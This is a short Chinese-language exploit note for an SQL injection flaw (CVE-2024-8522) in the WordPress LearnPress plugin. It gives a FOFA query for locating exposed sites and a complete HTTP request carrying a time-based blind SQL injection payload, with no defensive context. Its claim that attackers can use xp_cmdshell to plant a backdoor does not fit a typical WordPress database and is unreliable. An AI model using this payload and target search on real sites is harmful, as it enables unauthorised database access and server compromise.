# WordPress系统插件LearnPress存在SQL注入漏洞(CVE-2024-8522)

WordPress系统插件LearnPress存在SQL注入漏洞，未经身份验证的攻击者通过漏洞执行任意SQL语句，调用xp_cmdshell写入后门文件，执行任意代码，从而获取到服务器权限。

## fofa

```javascript
body="/wp-content/plugins/learnpress"
```

## poc

```javascript
GET /wp-json/learnpress/v1/courses?c_only_fields=IF(COUNT(*)!=-2,(SLEEP(8)),0) HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Connection: close
```

![image-20240926094748650](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202409260948413.png)